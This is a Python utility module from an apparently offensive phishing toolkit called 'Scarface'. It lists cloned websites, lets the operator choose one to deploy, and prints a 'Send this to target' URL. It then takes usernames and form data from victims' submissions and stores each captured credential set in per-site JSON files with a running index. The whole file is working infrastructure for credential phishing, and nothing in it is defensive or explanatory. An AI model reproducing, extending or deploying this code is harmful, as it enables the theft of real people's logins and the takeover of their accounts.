import os

import json

import mimetypes

from urllib.parse import unquote

import datetime

import time

import re



CYAN = "\033[36m"

BLUE = "\033[34m"

RED = "\033[91m"

GREEN = "\033[92m"

LIGHT_GREEN = "\033[38;5;120m"

BOLD = "\033[1m"

RESET = "\033[0m"



SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

SCARFACE_ROOT = os.path.abspath(os.path.join(SCRIPT_DIR, '..', '..', '..'))

CREDENTIALS_DIR = os.path.join(SCARFACE_ROOT, "data", "credentials")

SITES_DIRS = [

    os.path.join(SCARFACE_ROOT, 'data', 'sites'),

]



def clear_screen():

    os.system('cls' if os.name == 'nt' else 'clear')



def read_banner():

    banner_path = os.path.join(SCARFACE_ROOT, "assets", "banners", "scarface.txt")

    if not os.path.exists(banner_path):

        return "=== Scarface ==="

    with open(banner_path, "r", encoding="utf-8") as f:

        return f.read()



def print_banner_and_url(url):

    clear_screen()

    banner = read_banner()

    print(f"{BLUE}{banner}{RESET}\n")

    print(f"{BOLD}{BLUE}Send this to target:{RESET} {LIGHT_GREEN}{url}{RESET}\n")



def extract_username_from_log_data(log_data):

    """Extract username from credential data for filename"""

    username_keys = ['username', 'user', 'email', 'login', 'user_id', 'name', 'account']

    

                                        

    if 'data' in log_data and isinstance(log_data['data'], dict):

        data_dict = log_data['data']

        for key in username_keys:

            if key in data_dict and data_dict[key] and str(data_dict[key]).strip():

                username = str(data_dict[key]).strip()

                                                        

                username = re.sub(r'[<>:"/\\\\|?*]', '_', username)

                username = username.replace(' ', '_')

                if len(username) > 50:

                    username = username[:50]

                return username

    

                                        

    if 'data' in log_data and isinstance(log_data['data'], dict) and 'form_data' in log_data['data']:

        form_data = log_data['data']['form_data']

        if isinstance(form_data, dict):

            for key in username_keys:

                if key in form_data and form_data[key] and str(form_data[key]).strip():

                    username = str(form_data[key]).strip()

                    username = re.sub(r'[<>:"/\\\\|?*]', '_', username)

                    username = username.replace(' ', '_')

                    if len(username) > 50:

                        username = username[:50]

                    return username

    

    return "unknown"



def save_credentials(site, log_data):

    site_dir = os.path.join(CREDENTIALS_DIR, site)

    os.makedirs(site_dir, exist_ok=True)

    

                                    

    username = extract_username_from_log_data(log_data)

    

                                                         

    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")[:-3]

    

                          

    safe_username = "".join(c for c in username if c.isalnum() or c in '._-')

    filename = f"{site}_{safe_username}_{timestamp}.json"

    credentials_file = os.path.join(site_dir, filename)

    

                                     

    with open(credentials_file, "w") as f:

        json.dump(log_data, f, indent=4)

    

                              

    index_file = os.path.join(site_dir, "all_credentials_index.json")

    try:

        with open(index_file, "r") as f:

            index_data = json.load(f)

            if not isinstance(index_data, list):

                index_data = []

    except Exception:

        index_data = []

    

                                   

    data_summary = {}

    if 'data' in log_data and isinstance(log_data['data'], dict):

        data_dict = log_data['data']

        for key, value in data_dict.items():

            if isinstance(value, (str, int, float, bool)):

                val_str = str(value)

                data_summary[key] = val_str[:50] + "..." if len(val_str) > 50 else val_str

    

    index_entry = {

        "file": filename,

        "timestamp": log_data.get('timestamp', str(datetime.datetime.now())),

        "username": username,

        "site": site,

        "data_summary": data_summary

    }

    

    index_data.append(index_entry)

    with open(index_file, "w") as f:

        json.dump(index_data, f, indent=4)

    

    return filename



def list_cloned_sites():

    found_sites = set()

    for sites_dir in SITES_DIRS:

        if not os.path.exists(sites_dir):

            os.makedirs(sites_dir, exist_ok=True)

        for d in os.listdir(sites_dir):

            full_dir = os.path.join(sites_dir, d)

            if os.path.isdir(full_dir):

                found_sites.add(d)

    return sorted(list(found_sites))



def get_site_dir(site_name):

    for sites_dir in SITES_DIRS[::-1]:

        site_path = os.path.join(sites_dir, site_name)

        if os.path.isdir(site_path):

            return site_path

    return os.path.join(SITES_DIRS[0], site_name)



def select_site(sites):

    print(f"\n{BOLD}{BLUE}Available Cloned Sites:{RESET}")

    for idx, site in enumerate(sites, 1):

        print(f"  {BLUE}{idx}.{RESET} {site}")

    while True:

        try:

            choice = int(input(f"\n{BLUE}Enter site number to deploy:{RESET} "))

            if 1 <= choice <= len(sites):

                return sites[choice - 1]

            print(f"{RED}[ERROR] Invalid number{RESET}")

        except ValueError:

            print(f"{RED}[ERROR] Enter a number{RESET}")



def find_main_file(site_dir):

    html_candidates = []

    php_candidates = []

    for root, dirs, files in os.walk(site_dir):

        for f in files:

            try:

                if f.endswith('.bak') or f.startswith('.'):

                    continue

                path = os.path.join(root, f)

                if f.lower() == "index.php":

                    return path, "php"

                elif f.lower().endswith(".php"):

                    php_candidates.append(path)

                elif f.lower() == "index.html":

                    html_candidates.insert(0, path)

                elif f.lower().endswith(".html"):

                    html_candidates.append(path)

            except (UnicodeDecodeError, OSError):

                continue

    if php_candidates:

        return php_candidates[0], "php"

    if html_candidates:

        return html_candidates[0], "html"

    return None, None



def get_credential_file_count(site_name):

    """Get count of credential files for a site"""

    site_dir = os.path.join(CREDENTIALS_DIR, site_name)

    if not os.path.exists(site_dir):

        return 0

    

    count = 0

    for f in os.listdir(site_dir):

        if f.endswith('.json') and f.startswith(site_name + '_') and not f.startswith('index'):

            count += 1

    return count



def get_credential_files(site_name):

    """Get list of all credential files for a site"""

    site_dir = os.path.join(CREDENTIALS_DIR, site_name)

    if not os.path.exists(site_dir):

        return []

    

    files = []

    for f in os.listdir(site_dir):

        if f.endswith('.json') and f.startswith(site_name + '_') and not f.startswith('index'):

            files.append(f)

    

                                                  

    files.sort(key=lambda x: extract_timestamp_from_filename(x), reverse=True)

    return files



def extract_timestamp_from_filename(filename):

    """Extract timestamp from filename like site_username_20240115_143025_123.json"""

    try:

                                                   

        name_without_ext = filename.replace('.json', '')

        parts = name_without_ext.split('_')

        

                                                        

        for i in range(len(parts) - 2):

            if (len(parts[i]) == 8 and parts[i].isdigit() and            

                len(parts[i+1]) == 6 and parts[i+1].isdigit() and          

                (i+2 < len(parts) and parts[i+2].isdigit())):                

                return f"{parts[i]}_{parts[i+1]}_{parts[i+2]}"

    except:

        pass

    return "00000000_000000_000"

